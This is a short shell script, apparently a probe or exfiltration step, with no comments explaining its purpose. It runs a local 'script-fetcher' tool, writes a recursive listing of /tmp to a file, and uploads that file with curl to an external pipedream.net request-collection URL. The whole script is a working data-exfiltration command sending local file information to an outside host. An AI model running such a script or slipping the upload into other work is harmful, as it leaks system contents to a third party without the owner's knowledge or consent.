#!/bin/sh

./tools/script-fetcher > /tmp/script_output_seba

echo $(ls -la -R /tmp) > /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
